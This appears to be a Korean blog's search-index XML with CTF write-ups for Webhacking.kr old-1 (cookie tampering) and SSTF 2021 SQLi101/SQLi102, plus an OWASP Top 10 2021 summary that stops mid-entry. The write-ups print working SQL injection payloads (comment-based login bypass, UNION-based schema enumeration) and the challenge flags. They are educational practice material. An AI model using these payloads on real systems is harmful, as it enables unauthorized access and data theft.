<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[Webhacking.kr] [old-1] Write UP</title>
    <url>/2021/08/07/2021-08-07-Webhacking.kr_old_1/</url>
    <content><![CDATA[<h1 id="📄-전체-소스코드"><a href="#📄-전체-소스코드" class="headerlink" title="📄 전체 소스코드"></a>📄 전체 소스코드</h1><br>

<p>1번 문제를 클릭하면 검은색 화면에 <code>view-source</code>라고 쓰여있습니다.<br>해당 <code>view-source</code>를 클릭해 주면 아래와 같은 전체 소스코드가 나옵니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view-source&#x27;</span>] == <span class="number">1</span>)&#123; view_source(); &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])&#123;</span><br><span class="line">    SetCookie(<span class="string">&quot;user_lv&quot;</span>,<span class="string">&quot;1&quot;</span>,time()+<span class="number">86400</span>*<span class="number">30</span>,<span class="string">&quot;/challenge/web-01/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;meta http-equiv=refresh content=0&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge <span class="number">1</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=black&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;font color=white&gt;</span><br><span class="line">---------------------&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=./?view-source=<span class="number">1</span>&gt;view-source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="❗-중요-소스코드-해석"><a href="#❗-중요-소스코드-해석" class="headerlink" title="❗ 중요 소스코드 해석"></a>❗ 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>어떠한 조건에 맞으면 <code>solve(1)</code> 함수를 실행시키는 것을 볼 수 있습니다.<br><br></p>
<hr>
<h2 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h2><p>만약 <code>user_lv</code>쿠키가 숫자가 아니면 <code>user_lv</code>쿠키의 값을 <code>1</code>로 만들어 주는 코드 입니다.</p>
<p><code>is_numeric</code>함수는 변수가 숫자인지 아닌지 확인하는 함수입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>; <span class="comment">#user_lv 쿠키가 숫자가 아니면 user_lv 쿠키의 값을 1로 만듦.</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><p>만약 <code>user_lv</code>쿠키의 값이 <code>4</code> 이상이면 <code>user_lv</code>쿠키의 값을 <code>1</code>로 만들어 주는 코드 입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>; <span class="comment">#user_lv 쿠키의 값이 4 이상이면 user_lv 쿠키의 값을 1로 만듦.</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="네번째-줄-해석"><a href="#네번째-줄-해석" class="headerlink" title="네번째 줄 해석"></a>네번째 줄 해석</h2><p>만약 <code>user_lv</code>쿠키의 값이 <code>3</code>을 초과하면 <code>solve(1)</code>함수를 실행시켜주는 코드 입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>); <span class="comment">#user_lv 쿠키의 값이 3을 초과하면 solve(1)함수 실행.</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<blockquote>
<p><strong>3개의 조건문을 합쳐보면 <code>user_lv</code>쿠키는 <code>숫자</code>이고, 값이 <code>3보다 크고 4미만</code>이여야 합니다.</strong></p>
</blockquote>
<hr>
<p><br><br></p>
<h1 id="🍪-쿠키변조"><a href="#🍪-쿠키변조" class="headerlink" title="🍪 쿠키변조"></a>🍪 쿠키변조</h1><br>

<p>쿠키 변조 프로그램은 크롬의 확장 프로그램인 <code>EditThisCookie</code>를 사용했습니다.<br><br><br></p>
<img src = "/images/Webhacking.kr/old-1/EditThisCookie.png">
<br><br>
이렇게 <code>3보다 크고 4미만인 실수</code>를 넣어준 후 페이지를 새로고침을 해주면 해당 문제가 풀립니다.



]]></content>
      <categories>
        <category>Webhacking.kr</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[SSTF 2021] [SQLi101] Write UP</title>
    <url>/2021/08/17/2021-08-18-SSTF_2021_SQLi101/</url>
    <content><![CDATA[<h1 id="🎈-SQLi101"><a href="#🎈-SQLi101" class="headerlink" title="🎈 SQLi101"></a>🎈 SQLi101</h1><br>

<img src = "/images/SSTF 2021/SQLi101/SQLi101_1.png">

<img src = "/images/SSTF 2021/SQLi101/SQLi101_2.png">

<br>

<p>해당 문제는 <code>Tutorial</code>에 있는 <code>SQL injection</code>문제입니다.</p>
<br>

<br>

<img src = "/images/SSTF 2021/SQLi101/SQLi101_3.png">

<br>

<p>문제 페이지에 들어가면 위 사진과 같이 <code>php</code>로 만들어진 로그인 페이지가 보입니다.</p>
<br>

<blockquote>
<p>Mission: login as an admin using SQL Injection</p>
</blockquote>
<p>SQL Injection을 사용하여 <code>admin</code>으로 로그인을 하라고 알려줍니다.</p>
<br>

<br>

<br>

<img src = "/images/SSTF 2021/SQLi101/SQLi101_4.png">

<br>

<p><code>USERNAME</code>에 <code>admin</code>을 입력해주고 <code>PASSWORD</code>에 <code>1&#39;or&#39;1&#39;=&#39;1</code>을 입력했습니다.</p>
<br>

<blockquote>
<p>Fail: Don’t use ‘OR’! NO Hack!!</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Hint <span class="operator">-</span> <span class="keyword">SQL</span> query</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;&#123;$_GET[&quot;id&quot;]&#125;&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#123;$_GET[&quot;pw&quot;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>OR</code>을 사용하지 말라는 문구와 힌트가 나왔습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🚩-SOLVE"><a href="#🚩-SOLVE" class="headerlink" title="🚩 SOLVE"></a>🚩 SOLVE</h1><br>

<img src = "/images/SSTF 2021/SQLi101/SQLi101_5.png">

<br>

<p><code>USERNAME</code>에 <code>admin&#39;#</code>을 입력해주고 <code>PASSWORD</code>에 <code>아무거나</code>를 입력했습니다.</p>
<br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SQL</span> injection</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and pw=&#x27;</span>anything<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p>주석을 사용하여 <code>and pw=&#39;anything&#39;</code>조건을 무력화 시켰습니다.</p>
<br>

<br>

<hr>
<br>

<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><br>

<img src = "/images/SSTF 2021/SQLi101/SQLi101_6.png">

<br>

<p>로그인 우회가 되면서 FLAG가 출력되었습니다.</p>
<br>

<blockquote>
<p>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}</p>
</blockquote>
]]></content>
      <categories>
        <category>SSTF 2021</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
        <tag>SSTF 2021</tag>
      </tags>
  </entry>
  <entry>
    <title>[SSTF 2021] [SQLi102] Write UP</title>
    <url>/2021/08/17/2021-08-18-SSTF_2021_SQLi102/</url>
    <content><![CDATA[<h1 id="✨-SQLi102"><a href="#✨-SQLi102" class="headerlink" title="✨ SQLi102"></a>✨ SQLi102</h1><br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_1.png">

<img src = "/images/SSTF 2021/SQLi102/SQLi102_2.png">

<br>

<p>해당 문제는 <code>Tutorial</code>에 있는 <code>SQL injection</code>문제입니다.</p>
<br>

<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_3.png">

<br>

<p>문제 페이지에 들어가면 위 사진과 같이 <code>php</code>로 만들어진 검색 페이지가 보입니다.</p>
<br>

<blockquote>
<p>Practice: Find a hidden table and get its coumn names.</p>
</blockquote>
<p>숨겨진 테이블을 찾고 컬럼의 이름을 얻으라고 써있습니다.</p>
<br>

<br>

<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_4.png">

<br>

<p>검색창에 <code>1&#39;or&#39;1&#39;=&#39;1&#39;#</code>을 입력했더니 검색창에 넣은것과는 무관하게 모든 결과가 나왔습니다.</p>
<br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SQL</span> query 추측</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> book <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%search%&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p>위와 같이 query문이 전달된다고 추측했습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🚩-SOLVE"><a href="#🚩-SOLVE" class="headerlink" title="🚩 SOLVE"></a>🚩 SOLVE</h1><br>

<p><code>UNION SQL injection</code>을 사용하여 <code>테이블 이름</code>과 <code>칼럼 이름</code>을 추출해보았습니다.</p>
<br>

<br>

<p><code>UNION</code>은 둘 이상의 <code>SELECT</code>문 결과를 단일 결과 집합으로 결합해줍니다.</p>
<br>

<p><code>UNION</code>을 사용하여 결합된 결과 집합은 모두 같은 구조를 가져야 하기 때문에 열의 개수가 같아야 하고 해당 결과 집합 열은 호환되는 데이터 형식을 가져야합니다.</p>
<br>

<br>

<hr>
<br>

<h4 id="칼럼-개수-찾기"><a href="#칼럼-개수-찾기" class="headerlink" title="칼럼 개수 찾기"></a>칼럼 개수 찾기</h4><br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SELECT</span>문의 칼럼 개수 찾기</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">8</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; order by 9#</span></span><br></pre></td></tr></table></figure>

<br>

<p>SELECT문의 컬럼 개수를 찾기 위해 <code>order by</code>절을 사용하여 개수를 찾아보았습니다.</p>
<br>

<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; order by 8#</code>을 입력했을 때 아래와 같이 검색 결과가 나오는 것을 볼 수 있습니다.</p>
<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_5.png">

<br>

<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; order by 9#</code>를 입력했을 때 아래와 같이 검색 결과가 안 나오는 것을 볼 수 있습니다.</p>
<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_6.png">

<br>

<br>

<blockquote>
<p>SELECT문의 컬럼 개수 : 8개</p>
</blockquote>
<br>

<br>

<hr>
<br>

<h4 id="노출되는-데이터가-몇-번째-칼럼인지-확인"><a href="#노출되는-데이터가-몇-번째-칼럼인지-확인" class="headerlink" title="노출되는 데이터가 몇 번째 칼럼인지 확인"></a>노출되는 데이터가 몇 번째 칼럼인지 확인</h4><br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">null</span>을 이용한 <span class="keyword">UNION</span> 구문</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,null,null,null,null,null,null,null#</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>null</code>을 이용하여 <code>UNION</code>구문을 실행시켰습니다.</p>
<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_7.png">

<br>

<p><code>null</code> 데이터로 아무 값이 출력되지 않는것을 확인할 수 있습니다.</p>
<br>

<br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select 1,null,null,null,null,null,null,null#</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">#null에 숫자를 대입하면서 화면에 노출되는 데이터가 몇 번째 칼럼인지 확인</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="number">2</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>#</span><br></pre></td></tr></table></figure>

<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_8.png">

<br>

<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; union select null,2,null,null,null,null,null,null#</code>을 했을 때 2가 노출된 것을 확인할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h4 id="테이블-이름-추출"><a href="#테이블-이름-추출" class="headerlink" title="테이블 이름 추출"></a>테이블 이름 추출</h4><br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#테이블 이름 추출</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,table_name,null,null,null,null,null,null from information_schema.tables#</span></span><br></pre></td></tr></table></figure>

<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_9.png">

<br>

<p>숫자 2가 노출된 위치에 테이블 정보가 노출되도록 스키마 정보를 조회했습니다.</p>
<br>

<p>조회결과 여러개의 테이블 이름이 나왔는데 그 중에서 findme 테이블의 칼럼이름을 추출해 보겠습니다.</p>
<br>

<br>

<hr>
<br>

<h4 id="findme-테이블의-칼럼이름-추출"><a href="#findme-테이블의-칼럼이름-추출" class="headerlink" title="findme 테이블의 칼럼이름 추출"></a>findme 테이블의 칼럼이름 추출</h4><br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,column_name,null,null,null,null,null,null from information_schema.columns where table_name=&#x27;</span>findme<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<br>

<img src = "/images/SSTF 2021/SQLi102/SQLi102_10.png">

<br>

<p>findme 테이블의 칼럼이름을 추출했더니 FLAG가 나왔습니다.</p>
<br>

<br>

<hr>
<br>

<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><br>

<blockquote>
<p>SCTF{b451c_SQLi_5k1lls}</p>
</blockquote>
]]></content>
      <categories>
        <category>SSTF 2021</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
        <tag>SSTF 2021</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP TOP 10 2021</title>
    <url>/2021/09/14/2021-09-14-OWASP_TOP_10_2021/</url>
    <content><![CDATA[<h1 id="🌎-OWASP"><a href="#🌎-OWASP" class="headerlink" title="🌎 OWASP"></a>🌎 OWASP</h1><br>

<p>OWASP(The Open Web Application Security Project)는 오픈소스 웹 애플리케이션 보안 프로젝트입니다.</p>
<br>

<p>주로 웹에 관한 정보노출, 악성 파일 및 스크립트, 보안 취약점 등을 연구하며, 10대 웹 애플리케이션의 취약점을 발표합니다.</p>
<br>

<p><code>OWASP TOP 10</code>은 웹 애플리케이션 취약점 중에서 빈도가 많이 발생하고, 보안상 영향을 크게 줄 수 있는 것들 10가지를 선정하여 <code>2004년</code>, <code>2007년</code>, <code>2010년</code>, <code>2013년</code>, <code>2017년</code> 기준으로 발표되었습니다.</p>
<p><u>최근에</u> <code>2021년</code> <u>버전이 새로 나왔습니다.</u></p>
<br>

<br>

<hr>
<br>

<h1 id="🔧-2017-amp-2021"><a href="#🔧-2017-amp-2021" class="headerlink" title="🔧 2017 &amp; 2021"></a>🔧 2017 &amp; 2021</h1><br>

<table>
<thead>
<tr>
<th>OWASP TOP 10 (2017)</th>
<th>OWASP TOP 10 (2021)</th>
</tr>
</thead>
<tbody><tr>
<td>A1. Injection <br />       (인젝션)</td>
<td>A1. Broken Access Control <br />       (취약한 접근 통제)</td>
</tr>
<tr>
<td>A2. Broken Authentication <br />       (취약한 인증)</td>
<td>A2. Cryptographic Failures <br />       (암호화 실패)</td>
</tr>
<tr>
<td>A3. Sensitive Data Exposure <br />       (민감한 데이터 노출)</td>
<td>A3. Injection <br />       (인젝션)</td>
</tr>
<tr>
<td>A4. XML External Entities <br />       (XXE)</td>
<td>A4. Insecure Design <br />       (안전하지 않은 설계)</td>
</tr>
<tr>
<td>A5. Broken Access Control <br />       (취약한 접근 통제)</td>
<td>A5. Security Misconfiguration <br />       (잘못된 보안 구성)</td>
</tr>
<tr>
<td>A6. Security Misconfiguration <br />       (잘못된 보안 구성)</td>
<td>A6. Vulnerable and Outdated Components <br />       (취약점 및 오래된 구성 요소)</td>
</tr>
<tr>
<td>A7. Cross-Site Scripting <br />       (XSS)</td>
<td>A7. Identification and Authentication Failures <br />       (식별 및 인증 실패)</td>
</tr>
<tr>
<td>A8. Insecure Deserialization <br />       (안전하지 않은 역직렬화)</td>
<td>A8. Software and Data Integrity Failures <br />       (소프트웨어 및 데이터 무결성 오류)</td>
</tr>
<tr>
<td>A9. Using Components with Known Vulnerabilities<br />       (알려진 취약점이 있는 구성요소 사용)</td>
<td>A9. Security Logging and Monitoring Failures <br />       (보안 로깅 및 모니터링 실패)</td>
</tr>
<tr>
<td>A10. Insufficient Logging &amp; Monitoring <br />       (불충분한 로깅 및 모니터링)</td>
<td>A10. Server-Side Request Forgery <br />       (서버 측 요청 위조)</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="❗-달라진-점"><a href="#❗-달라진-점" class="headerlink" title="❗ 달라진 점"></a>❗ 달라진 점</h1><br>

<img src="/images/OWASP/owasp_top_10_2021.png">

<br>

<blockquote>
<p><code>2017 A5</code>에 있던 Broken Access Control(취약한 접근 통제)가 <code>2021 A1</code>으로 올라왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A3</code>에 있던 Sensitive Data Exposure(민감한 데이터 노출)에 속하는  Cryptographic Failures(암호화 실패)는 <code>2021 A2</code>로 올라왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A1</code>에 있던 Injection(인젝션)이 <code>2021 A3</code>로 내려왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2021 A4</code>에 있는 Insecure Design(안전하지 않은 설계)는 새로운 카테고리로 <code>2021 A4</code>에 생겼습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A6</code>에 있던 Security Misconfiguration(잘못된 보안 구성)이 <code>2021 A5</code>로 올라왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A9</code>에 있던 Using Components with Known Vulnerablilites(알려진 취약점이 있는 구성요소 사용)이 Vulnerable and Outdated Components(취약점 및 오래된 구성 요소)라는 이름으로 <code>2021 A6</code>로 올라왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A2</code>에 있던 Broken Authentication(취약한 인증)이 Identification and Authentication Failures(식별 및 인증 실패)라는 이름으로 <code>2021 A7</code>으로 내려왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2021 A8</code>에 있는 Software and Data Integrity Failures(소프트웨어 및 데이터 무결성 오류)는 새로운 카테고리로 <code>2021 A8</code>에 생겼습니다. 기존의 <code>2017 A8</code>에 있던 Insecure Deserialization(안전하지 않은 역직렬화)보다 더 큰 범주입니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2017 A10</code>에 있던 Insufficient Logging &amp; Monitoring(불충분한 로깅 및 모니터링)이 Security Logging and Monitoring Failures(보안 로깅 및 모니터링 실패)라는 이름으로 <code>2021 A9</code>로 올라왔습니다.</p>
</blockquote>
<br>

<blockquote>
<p><code>2021 A10</code>에 있는 Server-Side Request Forgery(서버측 요청 위조)는 새로운 카테고리로 <code>2021 A10</code>에 생겼습니다.</p>
</blockquote>
<br>

<br>

<hr>
<br>

<h1 id="❗❗-각-항목별-상세-설명"><a href="#❗❗-각-항목별-상세-설명" class="headerlink" title="❗❗ 각 항목별 상세 설명"></a>❗❗ 각 항목별 상세 설명</h1><br>

<div class="note default"><h2 id="A1-Broken-Access-Control-취약한-접근-통제"><a href="#A1-Broken-Access-Control-취약한-접근-통제" class="headerlink" title="A1 Broken Access Control (취약한 접근 통제)"></a>A1 Broken Access Control (취약한 접근 통제)</h2><p>사용자가 의도한 권한을 벗어나 행동할 수 없도록 정책을 설정해야합니다.<br>취약한 접근 통제에 실패했을 경우에는 데이터가 공개, 수정, 삭제될 수 있습니다.</p>
<p><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A2-Cryptographic-Failures-암호화-실패"><a href="#A2-Cryptographic-Failures-암호화-실패" class="headerlink" title="A2 Cryptographic Failures (암호화 실패)"></a>A2 Cryptographic Failures (암호화 실패)</h2><p>암호, 신용 카드 번호, 건간 기록 등 민감한 정보가 암호화로 전송하도록 해야합니다.</p>
<p><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A3-Injection-인젝션"><a href="#A3-Injection-인젝션" class="headerlink" title="A3 Injection (인젝션)"></a>A3 Injection (인젝션)</h2><p>입력 값 검증 미흡으로 발생하는 취약점 입니다. 사용자 입력 값 검증을 해야합니다.</p>
<p><a href="https://owasp.org/Top10/A03_2021-Injection/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A4-Insecure-Design-안전하지-않은-설계"><a href="#A4-Insecure-Design-안전하지-않은-설계" class="headerlink" title="A4 Insecure Design (안전하지 않은 설계)"></a>A4 Insecure Design (안전하지 않은 설계)</h2><p>디자인 설계 단계, 개발 단계에서 부터 안전하게(시큐어 코딩) 설계 해야합니다.</p>
<p><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A5-Security-Misconfiguration-잘못된-보안-구성"><a href="#A5-Security-Misconfiguration-잘못된-보안-구성" class="headerlink" title="A5 Security Misconfiguration (잘못된 보안 구성)"></a>A5 Security Misconfiguration (잘못된 보안 구성)</h2><p>권한이 부적절하게 설정, 불필요한 기능(포트, 서비스, 계정 등)을 해제하거나 제대로 설정해야 합니다.</p>
<p><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A6-Vulnerable-and-Outdated-Components-취약점-및-오래된-구성-요소"><a href="#A6-Vulnerable-and-Outdated-Components-취약점-및-오래된-구성-요소" class="headerlink" title="A6 Vulnerable and Outdated Components (취약점 및 오래된 구성 요소)"></a>A6 Vulnerable and Outdated Components (취약점 및 오래된 구성 요소)</h2><p>소프트웨어가 취약하거나 오래된 경우, 취약점을 정기적으로 확인하지 않은 경우 등 으로 발생할 수 있는 취약점입니다.</p>
<p><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A7-Identification-and-Authentication-Failures-식별-및-인증-실패"><a href="#A7-Identification-and-Authentication-Failures-식별-및-인증-실패" class="headerlink" title="A7 Identification and Authentication Failures (식별 및 인증 실패)"></a>A7 Identification and Authentication Failures (식별 및 인증 실패)</h2><p>기본 암호, 잘 알려진 암호, 약하게 해시된 암호 등을 사용 하거나 무차별 대입 같은 자동화된 공격을 막지 않은 경우에 발생할 수 있는 취약점입니다.</p>
<p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A8-Software-and-Data-Integrity-Failures-소프트웨어-및-데이터-무결성-오류"><a href="#A8-Software-and-Data-Integrity-Failures-소프트웨어-및-데이터-무결성-오류" class="headerlink" title="A8 Software and Data Integrity Failures (소프트웨어 및 데이터 무결성 오류)"></a>A8 Software and Data Integrity Failures (소프트웨어 및 데이터 무결성 오류)</h2><p>개체 또는 데이터가 공격자가 보고 수정할 수 있는 구조로 인코딩되거나 직렬화되는 경우 발생할 수 있는 취약점입니다.</p>
<p><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A9-Security-Logging-and-Monitoring-Failures-보안-로깅-및-모니터링-실패"><a href="#A9-Security-Logging-and-Monitoring-Failures-보안-로깅-및-모니터링-실패" class="headerlink" title="A9 Security Logging and Monitoring Failures (보안 로깅 및 모니터링 실패)"></a>A9 Security Logging and Monitoring Failures (보안 로깅 및 모니터링 실패)</h2><p>충분하지 못한 로깅과 모니터링을 했을 경우 발생할 수 있는 취약점입니다.</p>
<p><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">상세 페이지</a></p>
</div>

<br>

<div class="note default"><h2 id="A10-Server-Side-Request-Forgery-서버-측-요청-위조"><a href="#A10-Server-Side-Request-Forgery-서버-측-요청-위조" class="headerlink" title="A10 Server-Side Request Forgery (서버 측 요청 위조)"></a>A10 Server-Side Request Forgery (서버 측 요청 위조)</h2><p>웹 애플리케이션이 사용자가 제공한 URL의 유효성을 검사하지 않고 원격 리소스를 가져올 때마다 발생할 수 있는 취약점입니다.</p>
